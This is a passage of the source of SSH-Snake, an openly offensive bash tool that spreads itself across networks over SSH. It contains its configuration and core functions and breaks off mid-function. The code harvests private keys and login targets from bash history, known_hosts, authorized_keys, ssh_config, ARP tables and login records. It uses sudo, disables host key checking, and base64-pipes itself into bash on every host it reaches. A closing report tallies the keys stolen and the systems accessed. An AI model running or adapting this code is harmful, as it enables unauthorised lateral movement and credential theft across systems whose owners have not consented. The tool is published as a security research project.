#
# SSH-Snake: Automated SSH-Based Network Traversal
# Copyright (C) 2024 Joshua Rogers <https://joshua.hu/>, <https://github.com/MegaManSec/SSH-Snake>
# GPL 3 License. See LICENSE and COPYING for more.
#

export THIS_SCRIPT=$(cat <<"MAIN_SCRIPT" # DO NOT EDIT THIS LINE

######
######
# SETTINGS
######
######



######
######
# General Settings
######
######


ignore_user=0 # [0|1]: Consider a dest already scanned based only on the ip address. If user1@host is accessed, further access to user2@host will not re-run scans. This may be useful in an environment where sudo is accessible by every user (because user1@host can already access the keys that user2@host can access).

use_sudo=1 # [1|0]: Attempt to use sudo on the dest. This may generate a large amount of security-related logs and can be extremely noisy.

ssh_timeout=3 # [3|n]: The connection timeout for ssh and DNS resolution. See ssh_config(5)'s ConnectTimeout.

retry_count=3 # [3|n]: In some cases, a recoverable error in ssh may be encountered (such as trying to access an an AWS instance with a disabled username). This number corresponds to the maximum amount of times the destination is tried again. It's generally advised to set this to at least 1.

ignored_users=() # ("ubuntu" "root"): A list of usernames that are always ignored. If we do somehow end up on a server with this username, we will print where we are but not scan the destination.

ignored_hosts=() # ("8.8.8.8" "example.com"): A list of hosts that are always ignored. If we do somehow end up on a server with this host, we will print where we are but not scan the destination. Best if it's an ip address.

ignored_dests=() # ("root@10.2.3.4" "user@host.com"): A list of destinations that are always ignored. If we do somehow end up on a server with this destination address, we will print where we are but not scan the destination.

ignored_key_files=("*badcert.pem*" "*badkey.pem*") # ("*badkey*" "*testkey*" "/etc/ssh/*" "/root/*/keys"): A list of locations that are ignored when searching for ssh keys. This setting supports globbing/wildcards using the standard asterisk as in any other bash script. Note that for example, "/dir/*/file" will also match "/dir/dir2/dir3/file".

custom_cmds=() # (): A list of commands that should be run after the script has been initialized and recursion has been checked. This means the commands will only be run ONCE when a destination is discovered for the first time. This list also supports sudo (if available), and can be used by using ${s} as a literal. For example, custom_cmds=('${s} ls /root')



######
######
# Private Key Discovery Settings
######
######

scan_paths=() # ("/home/*/" "/root/"): A list containing files or directories which should be searched for SSH private keys. Note that discovery of private keys is an intensive procedure, and scanning paths with many possible private key files can be slow. This setting supports globbing/wildcards using the standard asterisk as in any other bash script. For example, scan_paths=("/etc/*/keys" "/tmp/").

scan_paths_depth=3 # [3|n]: If using scan_paths, specify the max-depth. Set to 99999 or some high number to have no restriction.



######
######
# Username and Host Discovery Settings
######
######

use_find_from_hosts=1 # [1|0]: Attempt to find hosts using /etc/hosts

use_find_arp_neighbours=1 # [1|0]: arp neighbours may be interesting hosts.

use_find_d_block=0 # [0|1]: If we are connected to, for example, 10.1.2.3, it may be interesting to attempt to connect to 10.1.2.0-10.1.2.3.255, therefore we add these to a list of potential hosts.



######
######
# Destination (user@host) Discovery Settings
######
######

use_find_from_authorized_keys=1 # [1|0]: authorized_keys files may contain a directive to only allow SSH from certain hosts. These are interesting, so try them.

use_find_from_last=1 # [1|0]: Check the last logins to this destination and attempt to ssh back to any addresses that have connected here before

use_find_from_prev_dest=1 # [1|0]: When a destination has been ssh'd into, attempt to SSH (with any keys found) back to the destination that we connected from.

use_find_from_known_hosts=1 # [1|0]: known_hosts files may contain hosts which have previously been SSH'd into.

use_find_from_hashed_known_hosts=0 # [0|1]: known_hosts files may contain hosts which have previously been SSH'd into. However, ssh's HashKnownHosts option hashes the host files. We can try to brute force, which we do by brute-forcing the c and d blocks of the current destination's ip add>

# It may be interesting to attempt to ssh into all of the destinations that have previously been ssh'd into by previously scanned destinations.
# Although we can't find a direct link using one of the strategies on the destination from destinations A->C doesn't mean the key won't be accepted (where B->C has already been found).
# Therefore, there are a few strategies for discovering these links.
# There are four possible values for this setting:
#
# 0: Nothing.
# 1: Attempt to ssh into any destinations that up until the beginning of this script running, have been successfully connected to (by PREVIOUS destinations). For example: A->B->C. C will attempt to connect to B and A, B will attempt to connect to A.
# 2: In addition to #1, also attempt to ssh into any destinations that are indirectly connected to this destination in the the future. For example: A->B->C. As above, but A will also attempt to connect to C.
use_find_from_ignore_list=0 # [0|2]

# use_find_from_ignore_list is slightly flawed. Consider the following:
# A->B->C ; Normal scan
# A->D->C ; A->D discovered naturally, D->C discovered using use_find_from_ignore_list=1 or use_find_from_ignore_list=2.
# A->C ; A->C discovered using use_find_from_ignore_list=2.
# In this case, the link from C->D will not be discovered because destination D was first discovered after destination C has already been scanned.
# Since C has already been scanned, it won't be scanned again, thus losing the valuable data of C->D.
#
# Therefore, we have a completely different strategy.
# Once the scan is completely finished (i.e. the inital script that a human runs), the whole scan completely re-runs with each of the previously discovered destinations added to interesting_dests().
# Effectively, this means that every destination will be scanned by every other destination. at least once.
# On the re-run, we do NOT attempt to discover any NEW users/hosts/dests, only discover keys. This means that although new chains may be discovered, no new destinations will be discovered.
# Note: it is also possible that new destinations will be discovered with this method, due to some strange network routing, however this is not intentional. (see XXX: Should we report that this is a NEW destination?)
use_retry_all_dests=1 # [0|1]



######
######
# Destination AND Private Key Discovery Settings
######
######

use_find_from_bash_history=1 # [1|0]: bash_history files may contain calls to ssh, scp or rsync, which may contain clues for users, hosts, dests, and private key locations. This is one of the best discovery techniques to leave enabled.

use_find_from_ssh_config=1 # [1|0]: ssh_config files may contain usernames, hosts, and private key locations.



######
######
# Combinatorial Destination Discovery Settings
######
######

interesting_users=("$USER" "root") # ("$USER" "root"): A list of usernames which are always tried for every host that has been found if use_combinate_interesting_users_hosts=1.
interesting_hosts=("127.0.0.1") # ("127.0.0.1"): A list of hosts which which are always tried for every user that has been found if use_combinate_interesting_users_hosts=1.
interesting_dests=() # ("root@10.1.1.1"): A list of destinations which are always tried if use_combinate_interesting_users_hosts=1.

use_combinate_interesting_users_hosts=1 # [1|0]: Combine all interesting users with all hosts to create destinations. Combine all interesting hosts with all users to create destination. Combine all interesting users with all interesting hosts to create destinations.

use_combinate_users_hosts_aggressive=0 # [0|1]: Combine all found usernames with all found hosts into attempted destinations. This may result in massive growth of attempted destinations (100 usernames discovered with 100 hostnames will result in 10,000 attempted destinations).















#########
#########
######### Do not edit anything beyond this point unless you know what you're doing!
#########
#########





























export LC_ALL="C"
export PATH="$PATH:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/bin"

declare -A priv_keys
declare -A key_files
declare -A home_folders
declare -A ssh_files
declare -A priv_keys_files
declare -A root_ssh_keys # Used only to keep track of the number of keys discovered.
declare -A root_ssh_hostnames_dests # Used only to keep track of the number of servers accessed. Format is the same as hostnames_chain: user@(host1:host2).
declare -A root_ssh_hosts_dests # Also used to keep track of the number of servers accessed. Format is the same as hosts_chain: user@host.
declare -A ssh_users
declare -A ssh_hosts
declare -A ssh_dests
declare -A _ignored_users
declare -A _ignored_hosts
declare -A _ignored_dests
declare -A _ignored_key_files
declare -A files
declare -A not_files
declare -A folders
declare -A not_folders
declare -A current_ips
declare -A ignore_list_array

_ignored_hosts["openssh.com"]=1
_ignored_hosts["255.255.255.255"]=1

# GLOBALS
ignore_separator="|"
ssh_options=(-oControlPath=none -oIdentitiesOnly=yes -oServerAliveInterval=300 -oTCPKeepAlive=no -oConnectTimeout="$ssh_timeout" -oStrictHostKeyChecking=no -oGlobalKnownHostsFile=/dev/null -oUserKnownHostsFile=/dev/null -oBatchMode=yes)
user="$USER"
script="$1"
hosts_chain="$(printf "%s" "$2" | base64 -d)" # This contains the exact chain we used to connect between servers.
hostnames_chain="$(printf "%s" "$5" | base64 -d)" # This contains the chain that includes all possible ip addresses of a server.
ignore_list="$3"
this_dest="$4"
this_host="${this_dest#*@}"
current_hostnames_ip=""
#current_hosts_ip=""
sshkeygen=("ssh-keygen" "-E" "md5" "-l" "-f")
indent=""
s=""

allowed_host_chars='[a-zA-Z0-9_.-]'
allowed_users_chars='[a-z_][a-z0-9_-]{0,31}'


# Print the title screen.
print_snake() {
  cat << "EOF"
                      __    __    __    __
                     /  \  /  \  /  \  /  \
____________________/  __\/  __\/  __\/  __\_______________________________,
___________________/  /__/  /__/  /__/  /__________________________________|
                   | / \   / \   / \   / \  \____                          |
                   |/   \_/   \_/   \_/   \    o \                         |
                                           \_____/--<                      |
       ---_ ......._-_--.                                                  |
      (|\ /      / /| \  \                                      ?          |
      /  /     .'  -=-'   `.                                  .            |
     /  /    .'             )                                '             |
   _/  /   .'        _.)   /                  _ -- ~~~ -- _      _______   |
  / o   o        _.-' /  .'               .-~               ~-.{__-----. : |
  \          _.-'    / .'*|             /                       \      | | |
   \______.-'//    .'.' \*|            :         O     O         :     | | |
    \|  \ | //   .'.' _ |*|            /\                       /------' j |
     `   \|//  .'.'_ _ _|*|           { {/~-.               .-~\~~~~~~~~~  |
      .  .// .'.' | _ _ \*|            \/ /  |~:- .___. -.~\  \ \          |
      \`-|\_/ /    \ _ _ \*\          / /\ \ | | { { \ \  } }  \ \         |
       `/'\__/      \ _ _ \*\        { {   \ \ |  \ \  \ \ /    } }        |
      /^|            \ _ _ \*         \ \   /\ \   \ \  /\ \   { {         |
     '  `             \ _ _ \          } } { { \ \  \ \/ / \ \  \ \        |
                       \_             / /   } }  \ \ }{ {    \ \ } }       |
 ___________________________         / /   { {     \ \{\ \    } { {        |
( Written for the mediocre. )       / /     } }     } }\\ \  / / \ \       |
(          By the mediocre. )      `-'     { {     `-'\ \`-'/ /   `-'      |
----------------------------               `-'        `-' `-'              |
                ^__^   o                                                   |
        _______\)xx(  o      <https://github.com/MegaManSec/SSH-Snake>     |
    \/\)       \)__(      By Joshua Rogers <https://joshua.hu/>            |
       | w----||  U                                                        |
       ||     ||                                  GPL 3, of course.        |
________________________~_____/^,___,-^\_________________~~_______________/`



EOF
}

# Print a summary of the settings we're using.
print_settings() {
  local setting_keys
  local setting_values
  local max_key_length
  local max_value_length
  local i

  setting_keys=("ignore_user" "use_sudo" "ssh_timeout" "retry_count" "scan_paths" "scan_paths_depth" "interesting_users" "interesting_hosts" "interesting_dests" "ignored_users" "ignored_hosts" "ignored_dests" "ignored_key_files" "custom_cmds" "use_combinate_interesting_users_hosts" "use_combinate_users_hosts_aggressive" "use_find_from_hosts" "use_find_from_last" "use_find_from_authorized_keys" "use_find_from_known_hosts" "use_find_from_ssh_config" "use_find_from_bash_history" "use_find_arp_neighbours" "use_find_d_block" "use_find_from_hashed_known_hosts" "use_find_from_prev_dest" "use_find_from_ignore_list" "use_retry_all_dests")
  setting_values=("$ignore_user" "$use_sudo" "$ssh_timeout" "$retry_count" "${scan_paths[*]}" "$scan_paths_depth" "${interesting_users[*]}" "${interesting_hosts[*]}" "${interesting_dests[*]}" "${ignored_users[*]}" "${ignored_hosts[*]}" "${ignored_dests[*]}" "${ignored_key_files[*]}" "${custom_cmds[*]}" "$use_combinate_interesting_users_hosts" "$use_combinate_users_hosts_aggressive" "$use_find_from_hosts" "$use_find_from_last" "$use_find_from_authorized_keys" "$use_find_from_known_hosts" "$use_find_from_ssh_config" "$use_find_from_bash_history" "$use_find_arp_neighbours" "$use_find_d_block" "$use_find_from_hashed_known_hosts" "$use_find_from_prev_dest" "$use_find_from_ignore_list" "$use_retry_all_dests")

  max_key_length=0
  max_value_length=0

  for ((i=0; i<${#setting_keys[@]}; i++)); do
    key_length="${#setting_keys[$i]}"
    value_length="${#setting_values[$i]}"

    ((key_length > max_key_length)) && max_key_length=$key_length
    ((value_length > max_value_length)) && max_value_length=$value_length
  done

  printf "|%-*s|%-*s|\n" "$((max_key_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_key_length + 4))"))" "$((max_value_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_value_length + 4))"))"
  printf "| %-*s | %-*s |\n" "$((max_key_length + 2))" "Setting" "$((max_value_length + 2))" "Value"
  printf "|%-*s|%-*s|\n" "$((max_key_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_key_length + 4))"))" "$((max_value_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_value_length + 4))"))"

  for ((i=0; i<${#setting_keys[@]}; i++)); do
    printf "| %-*s | %-*s |\n" "$((max_key_length + 2))" "${setting_keys[$i]}" "$((max_value_length + 2))" "${setting_values[$i]}"
  done

  printf "|%-*s|%-*s|\n\n\n" "$((max_key_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_key_length + 4))"))" "$((max_value_length + 2))" "$(printf -- '-%.0s' $(seq "$((max_value_length + 4))"))"
}

# Function to remove specific bash functions and their calls from the script passed via $1.
remove_functions() {
  local this_script
  local function_names

  this_script="$1"
  function_names="$2"

  # Use awk to filter out the functions and their calls from the script
  printf "%s" "$this_script" | awk -v fnames="$function_names" '
    # ^func_name()
    function is_func_line() {
      for (i in funcs) {
        if ($0 ~ "^" funcs[i] "\\(\\)") {
          return 1
        }
      }
      return 0
    }

    # [space][space][...] func_name
    function is_func_call() {
      for (i in funcs) {
        if ($0 ~ "^[ ]*" funcs[i]) {
          return 1
        }
      }
      return 0
    }

    BEGIN {
      split(fnames, funcs, " ");
      in_func = 0
    }

    is_func_line() { in_func = 1; next }
    # end of the function is ^}
    /^\}/ { if (in_func) { in_func = 0; next } }
    is_func_call() { next }
    !in_func { print }
  '
}

# Function to convert all final ssh destinations from root_ssh_hostnames_dests from the format user@(host1:host2:...) (aka hostnames_chain format) into user@host user@host2 ...
# Prints all user@host combinations, including those from root_ssh_hosts_dests (aka hosts_chain format)
# This is only used if use_retry_all_dests is set to 1.
gen_retried_interesting_dests() {
  local ssh_dest

  # ssh_dest format is user@(host1:host2)
  # Output of this is \x22user@host1\x22\n\x22user@host2\x22
  for ssh_dest in "${!root_ssh_hostnames_dests[@]}"; do
    printf "%s" "$ssh_dest" | awk -F'[@():]' -v OFS='@' '
    {
      user = $1
      for (i = 2; i <= NF; i++) {
        if ($i != "" && user != "") {
          print "\\x22" user "@" $i "\\x22"
        }
      }
    }'
  done

  for ssh_dest in "${!root_ssh_hosts_dests[@]}"; do
    printf "\\\x22%s\\\x22\n" "$ssh_dest"
  done
}

# If the script is run for the first time (or: the script has not been executed with the script's contents as the first argument) it executes itself.
# It also removes any comments, unnecessary white-spaces, and unused functions from the script (including this one!), to save space for arguments.
shape_script() {
  local line
  local local_script
  local opt_function_list
  local opt_function
  local ssh_dest

  opt_function_list=("use_combinate_interesting_users_hosts" "use_combinate_users_hosts_aggressive" "use_find_from_hosts" "use_find_from_last" "use_find_from_authorized_keys" "use_find_from_known_hosts" "use_find_from_ssh_config" "use_find_from_bash_history" "use_find_arp_neighbours" "use_find_d_block" "use_find_from_hashed_known_hosts" "use_find_from_prev_dest" "use_find_from_ignore_list" "use_retry_all_dests")

  for opt_function in "${opt_function_list[@]}"; do
    if [[ ${!opt_function} -eq 0 ]]; then
      remove_function+="${opt_function#use_} "
    fi
    # Two-off because use_find_from_ignore_list is variable from 0-2, and we use use_retry_all_dests to know we're inside a loop.
    [[ "$opt_function" =~ use_find_from_ignore_list|use_retry_all_dests ]] && continue
    remove_function+="$opt_function "
  done

  if [[ ${#custom_cmds[@]} -eq 0 ]]; then
    remove_function+="exec_custom_cmds "
    remove_function+="custom_cmds "
  fi
  if [[ ${#scan_paths[@]} -eq 0 || $scan_paths_depth -lt 1 ]]; then
    remove_function+="find_ssh_keys_paths "
    remove_function+="scan_paths "
    remove_function+="scan_paths_depth "
  fi
  if [[ ${#ignored_users[@]} -eq 0 && ${#ignored_hosts[@]} -eq 0 && ${#ignored_dests[@]} -eq 0 ]]; then
    remove_function+="init_ignored "
    remove_function+="ignored_users ignored_hosts ignored_dests "
  fi
  if [[ $use_combinate_users_hosts_aggressive -eq 0 ]] && [[ ${#interesting_users[@]} -eq 0 || $use_combinate_interesting_users_hosts -eq 0 ]]; then
    remove_function+="find_from_hosts find_arp_neighbours find_d_block " # These functions only find hosts, and since we have no interesting_users, we're never going to combinate them using combinate_interesting_users_hosts. XXX: Should we warn the user?
  fi
  if [[ $use_find_from_authorized_keys -eq 0 && $use_find_from_known_hosts -eq 0 && $use_find_from_hashed_known_hosts -eq 0 ]]; then # find_user_from_file is only used in these three functions.
  remove_function+="find_user_from_file "
  fi
  if [[ $use_combinate_users_hosts_aggressive -eq 1 ]]; then
    remove_function+="use_combinate_interesting_users_hosts combinate_interesting_users_hosts " # use_combinate_users_hosts_aggressive is a superset of combinate_interesting_users_hosts.
  fi
  if [[ $use_combinate_interesting_users_hosts -eq 0 && $use_combinate_users_hosts_aggressive -eq 0 ]]; then
    remove_function+="interesting_hosts interesting_users "
    if [[ $use_retry_all_dests -eq 0 ]]; then
      remove_function+="interesting_dests "
    fi
  fi
  if [[ ${#interesting_users[@]} -eq 0 && ${#interesting_hosts[@]} -eq 0 && ${#interesting_dests[@]} -eq 0 ]]; then
    if [[ $use_retry_all_dests -eq 0 ]]; then
      remove_function+="interesting_dests "
    fi
    remove_function+="combinate_interesting_users_hosts use_combinate_interesting_users_hosts "
    remove_function+="interesting_users interesting_hosts "
  fi
  if [[ $use_find_from_ignore_list -eq 0 ]]; then
    remove_function+="use_find_from_ignore_list "
  fi
  if [[ $use_retry_all_dests -eq 0 ]]; then
    remove_function+="use_retry_all_dests "
  fi
  if [[ $use_sudo -eq 0 ]]; then
    remove_function+="check_sudo use_sudo s= "
  fi
  if [[ ${#ignored_key_files[@]} -eq 0 ]]; then
    remove_function+="ignored_key_files "
  fi

  # Remove this function
  remove_function+="shape_script "
  # Remove the fin_root function
  remove_function+="fin_root "
  # Remove the print_settings function
  remove_function+="print_settings "
  # Remove the remove_functions function
  remove_function+="remove_functions "
  # Remove the print_snake function
  remove_function+="print_snake "
  # Remove the gen_retried_interesting_dests function
  remove_function+="gen_retried_interesting_dests "
  # Remove the root_ssh_keys, root_ssh_hostnames_dests, and root_ssh_hosts_dests variables
  remove_function+="root_ssh_keys root_ssh_hostnames_dests root_ssh_hosts_dests"

  # TODO: We should remove declare -A root_ssh_keys, declare -A root_ssh_hostnames_dests, and declare -A root_ssh_hosts_dests somehow.

  # Actually remove it all.
  local_script="$(remove_functions "$THIS_SCRIPT" "$remove_function")"

  # Remove all comments and unnecessary white-spaces.
  local_script="$(printf "%s" "$local_script" | sed -e 's/^[ ]*//' -e 's/^#.*$//' -e 's/[ ]#.*//' -e '/^[ ]*$/d')"

  # XXX: If we want to see what script we're running, then this is the place to print "$local_script". Or above the previous line.
  # printf "%s" "$local_script"

  while IFS= read -r line; do
    if [[ "$line" == *"EXTERNAL_MSG: KEY"* ]]; then
      root_ssh_keys["${line##* }"]=1
    elif [[ "$line" =~ ($allowed_users_chars@\([0-9\.:]*\))$ ]]; then # Capture user@(host1:host2)
      root_ssh_hostnames_dests["${BASH_REMATCH[1]}"]=1
    elif [[ "$line" =~ ($allowed_users_chars@[0-9\.]*)$ ]]; then # capture user@host
      root_ssh_hosts_dests["${BASH_REMATCH[1]}"]=1
    fi
    printf "[%s]" "$(date +%s)"
    printf "%s\n" "$line"
  done < <(echo 'printf "%s" "$1" | base64 -d | bash --noprofile --norc -s $1' | bash --noprofile --norc -s "$(printf "%s" "$local_script" | base64 | tr -d '\n')" 2>&1 | grep -v -F 'INTERNAL_MSG')

  [[ $use_retry_all_dests -eq 1 ]] || return

  local retried_interesting_dests
  retried_interesting_dests="$(gen_retried_interesting_dests | sort | uniq)"

  [[ "${#retried_interesting_dests}" -gt 0 ]] || return

  printf "\n\n---------------------------------------\n\n"
  printf "use_retry_all_dests=1. Re-starting.\n"


  printf "%s destinations (from %s unique servers) added to interesting_dests.\n" "$(echo "$retried_interesting_dests" | wc -l)" "${#root_ssh_hostnames_dests[@]}"
  retried_interesting_dests="$(echo "$retried_interesting_dests" | tr '\n' ' ')"

  printf "\n---------------------------------------\n\n\n"

  local_script="$(printf "%s" "$local_script" | sed 's/^interesting_dests=(/interesting_dests=('"$retried_interesting_dests"'/')"
  local_script="$(printf "%s" "$local_script" | sed 's/^use_retry_all_dests=1/use_retry_all_dests=2/')"

  # We do not want to find any new dests and so on, so remove all of the non-key functions.
  # If you REALLY want to look for new users/hosts/dests using use_combinate_users_hosts_aggressive or combinate_interesting_users_hosts(interesting_users/interesting_hosts), then replace the following line with remove_function="retry_all_dests".
  remove_function="find_from_authorized_keys find_from_hosts find_from_last find_arp_neighbours find_d_block find_from_ignore_list find_from_known_hosts find_from_hashed_known_hosts find_from_prev_dest combinate_users_hosts_aggressive combinate_interesting_users_hosts interesting_users interesting_hosts deduplicate_resolved_hosts_keys init_ignored ignored_users ignored_hosts ignored_dests find_user_from_file "
  local_script="$(remove_functions "$local_script" "$remove_function")"

  while IFS= read -r line; do
    if [[ "$line" == *"EXTERNAL_MSG: KEY"* ]]; then
      root_ssh_keys["${line##* }"]=1
    elif [[ "$line" =~ ($allowed_users_chars@\([0-9\.:]*\))$ ]]; then # Capture user@(host1:host2)
      root_ssh_hostnames_dests["${BASH_REMATCH[1]}"]=1
    elif [[ "$line" =~ ($allowed_users_chars@[0-9\.]*)$ ]]; then # capture user@host
      root_ssh_hosts_dests["${BASH_REMATCH[1]}"]=1
    fi
    printf "[%s]" "$(date +%s)"
    printf "%s\n" "$line"
  done < <(echo 'printf "%s" "$1" | base64 -d | bash --noprofile --norc -s $1' | bash --noprofile --norc -s "$(printf "%s" "$local_script" | base64 | tr -d '\n')" 2>&1 | grep -v -F 'INTERNAL_MSG')
}

# If this is the first IP in the chain, prepare some data from the chain, which will be printed by the root script.
fin_root() {
  local root_ssh_dest
  declare -A root_ssh_hosts

  for root_ssh_dest in "${!root_ssh_hostnames_dests[@]}"; do
    root_ssh_hosts["${root_ssh_dest#*@}"]=1
  done

  printf "\n\n\n"

cat <<"EOF"
               ______
          _.-""      ""-._
       .-'                `-.
     .'      __.----.__      `.
    /     .-"          "-.     \
   /    .'                `.    \
  J    /                    \    L
  F   J                      L   J
 J    F                      J    L
 |   J                        L   |
 |   |                        |   |
 |   J                        F   |
 J    L                      J    F
  L   J   .-""""-.           F   J
  J    \ /        \   __    /    F
   \    (|)(|)_   .-'".'  .'    /
    \    \   /_>-'  .<_.-'     /
     `.   `-'     .'         .'
       `--.|___.-'`._    _.-'
           ^         """"

           ..             ..
          ( '`<          ( '`<  ...Summary Report:
           )(             )(
    ( ----'  '.    ( ----'  '.
    (         ;    (         ;
     (_______,'     (_______,'
~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^

EOF

  printf "Unique private keys discovered: %s\n" "${#root_ssh_keys[@]}"
  printf "Unique shell accounts accessed: %s\n" "${#root_ssh_hostnames_dests[@]}"
  printf "Unique systems accessed: %s\n" "${#root_ssh_hosts[@]}"
  printf "\nNeed a list of servers accessed? Run one of these commands:\n\n"
cat <<"EOF"
grep -oE "[a-z_][a-z0-9_-]{0,31}@[0-9\.]*$" output.log  | sort | uniq
grep -oE "[a-z_][a-z0-9_-]{0,31}@\([0-9\.:]*\)$" output.log  | sort | uniq

EOF

  printf -- "-- https://joshua.hu/ --\n"
  printf -- "-- https://github.com/MegaManSec/SSH-Snake --\n"
  printf "\nThanks for playing!\n"
}

# Check each of the required programs and bash version.
# Prints the missing command on fail.
check_commands() {
  local required_commands
  local required_command

  required_commands=("ssh-keygen" "readlink" "ssh" "basename" "base64" "awk" "sort" "uniq" "grep" "tr" "find" "cat") # "sudo" "hostname" "xargs" "getent" "ifconfig" "ipconfig" "ip" "timeout" "dscacheutil" are all semi-optional. "sed" is necessary only by the first system.

  for required_command in "${required_commands[@]}"; do
    if ! command -v "$required_command" >/dev/null 2>&1; then
      echo "$required_command"
      return
    fi
  done

  if [[ "${BASH_VERSINFO:-0}" -lt 4 ]]; then
    echo "bash"
    return
  fi
}

# Ensures that the server is running bash and has all of the required inbuilts and programs required for the script to run.
# If a version of bash is not compatible with the script, it reports the version but does not continue.
# If any of the required programs/inbuilts are missing, it also reports the violation and quits.
check_startup() {
  local missing_command

  missing_command="$(check_commands)"

  # This is the beginning of the main script: print_snake, print_settings, then shape_script (which executes the script via stdin)
  if [[ -z "$script" ]]; then
    if ! command -v sed >/dev/null 2>&1; then
      printf "Could not begin because 'sed' is not available!\n"
      exit 1
    elif [[ -n "$missing_command" ]]; then
      printf "Could not begin because %s is not available!\n" "$missing_command"
      exit 1
    fi
    print_snake
    print_settings
    shape_script
    fin_root
    exit 0
  fi

  if [[ -n "$missing_command" ]]; then
    printf "INTERNAL_MSG: command not found: %s\n" "$required_command"
    exit 1
  fi

  if ! printf "%s" "$script" | base64 -d >/dev/null 2>&1; then
    printf "Usage: bash %s >output.log\n" "$0"
    exit 1
  fi
}

# Prints the current $ignore_separator$user@$current_hostnames_ip$ignore_separator and exits.
# Also print the ignore list for $current_hosts_ip if $current_hosts_ip is set (aka $user@$current_hosts_ip is not in $current_hostnames_ip)
# This should only be called on a successful scan.
fin() {
  printf "INTERNAL_MSG: ignore list: %s%s@%s%s\n" "$ignore_separator" "$user" "$current_hostnames_ip" "$ignore_separator"
  #  [[ -n "$current_hosts_ip" ]] && printf "INTERNAL_MSG: ignore list: %s%s@%s%s\n" "$ignore_separator" "$user" "$current_hosts_ip" "$ignore_separator" # XXX: Is this smart to do? Probably not: disabled until further notice.

  exit 0
}

# If use_sudo is set, we check whether we are able to use sudo.
# If we can use sudo, set $s with the sudo command.
check_sudo() {
  [[ $use_sudo -eq 1 ]] && sudo -n true >/dev/null 2>&1 && s="sudo"
}

# Different versions of ssh-keygen support different options.
# Older versions of ssh-keygen do not support the -E argument to specify the hashing method of a public key, instead only allowing MD5.
# Therefore, check whether we can use -E, and if not, set $sshkeygen to ssh-keygen -lf.
check_sshkeygen() {
  [[ "$(ssh-keygen -E 2>&1)" == *"unknown option"* ]] && sshkeygen=("ssh-keygen" "-l" "-f")
}

# Older versions of ssh-keygen do not support the appending of HostkeyAlgorithms and KexAlgorithms values.
# Don't use them unless they're supported.
check_ssh_options() {
  local ssh_extra_options
  local ssh_extra_option

  ssh_extra_options=(-oHostkeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1)
  for ssh_extra_option in "${ssh_extra_options[@]}"; do
    [[ "$(ssh "$ssh_extra_option" 2>&1)" =~ Bad\ protocol\ 2\ host\ key\ algorithms|Bad\ SSH2\ KexAlgorithms|Bad\ key\ types|diffie-hellman-group1-sha1|ssh-rsa ]] || ssh_options+=("$ssh_extra_option")
  done
  ssh_extra_option="-oPubkeyAcceptedKeyTypes=+ssh-rsa"
  [[ "$(ssh "$ssh_extra_option" 2>&1)" =~ Bad\ configuration\ option|pubkeyacceptedkeytypes ]] || ssh_options+=("$ssh_extra_option")
}

# Determining the ip address of the current destination is difficult because it may have multiple ip addresses, and we are likely to connect to both of them eventually (including 127.0.0.1 for example).
# This means that we effectively have multiple hosts despite it being the same destination, meaning pathways may be left mangled (A->B->C exists, and A->C exists too but with a different ip address).
# Therefore, we take two strategies for finding and printing the addresses of the destination.
#
# Firstly, define the current destination's address as the concatenation of all of its ipv4 addresses: IP_1:IP_2:IP_3. The output of that will be:
# user@(IP_1:IP_2:IP_3)[keyfile]->user@(IP_1:IP_2:IP_3)[keyfile]->user@(IP_1:IP_2:IP_3)....
# This output isn't particuarly useful for using to actually connect to hosts using the data, but it is useful for creating graphs (because each destination will correspond to a collection of ip addresses).
# This format of ip address is also useful for the script to determine whether a destination has already been scanned or not (aka whether the destination are in the ignore_list).
# Therefore, we split all ips for this host and add a separator ":", which we use for the ignore_list as well.
#
# Secondly, we determine the destination's address which the script actually used to connect to this server:
# user@host[keyfile]->user@host[keyfile]->user@host
# This output is useful to see what the script actually did, and can therefore be used to recreate the ssh command needed to get from server A to server B.
init_current_ips() {
  local current_ip
  local default_route
  local default_ip
  local iface

  # Create the current_ips array containing all of the ipv4 addresses of the destination.
  while IFS= read -r current_ip; do
    current_ips["$current_ip"]=1
  done < <(${s} hostname -I 2>/dev/null | tr ' ' '\n' | grep -F '.')

  # mac support
  while IFS= read -r iface; do
    while IFS= read -r current_ip; do
      current_ips["$current_ip"]=1
    done < <(${s} ipconfig getifaddr "$iface" 2>/dev/null)
  done < <(${s} ifconfig -l 2>/dev/null | tr ' ' '\n')

  current_hostnames_ip="$(IFS=:; echo "${!current_ips[*]}")"

  # Then, determine the ip address for connecting to the default gateway. Otherwise, to the internet.
  # sudo is required on some systems, so use it if possible.
  if ip route show default >/dev/null 2>&1; then
    default_route="$(${s} ip route show default 2>/dev/null | awk '/default via/{print $3; exit}')"
    default_route="${default_route:-"1.1.1.1"}"
    default_ip="$(${s} ip route get "$default_route" 2>/dev/null | awk -F'src' '{print $NF; exit}' | awk '{print $1}')"
  elif route -n get 1.1.1.1 >/dev/null 2>&1; then
    iface="$(${s} route -n get 1.1.1.1 2>/dev/null | awk '/interface: / {print $2;exit}')"
    default_ip="$(${s} ipconfig getifaddr "$iface" 2>/dev/null)"
  fi

  default_ip="${default_ip:-"???"}"

  # If $this_host has not been passed to us, set our address to the default ip address.
  this_host="${this_host:-"$default_ip"}"

  # If hostname -I does not work, then just fill the array with $this_host.
  [[ ${#current_ips[@]} -eq 0 ]] && current_ips["$this_host"]=1 && current_hostnames_ip="$this_host"
}

# Initialize this server/destination's chains.
# Using both chains provided to the script by the $2 and $5 arguments, we combine them with the current username and ip addresses, separated by ->.
init_chains() {
  # Initalize the hosts_chain. This chain is the real pathway we used to access this server/destination.
  # For example, user@host[key]->user@host.
  hosts_chain="$hosts_chain${hosts_chain:+->}$user@$this_host"
  # Initalize the hostnames_chain. This chain is not the exact pathway in the network sense, but rather the pathway of unique servers (independent of the ip address we used to access them).
  # For example, user@(host)[key]->user@(host:host:host:host)
  hostnames_chain="$hostnames_chain${hostnames_chain:+->}$user@($current_hostnames_ip)"
}

# Determine the length of the indentation based on the current chain's length
# Which chain does not matter, but we use hosts_chain.
# For each "]->", we want to indent 1 characters.
# To determine the amount of ]-> instances, we loop through the chain and continuously cut where it's found.
init_indent() {
  local recursive_indent_length
  local temp_chain
  local pattern

  pattern=']->'
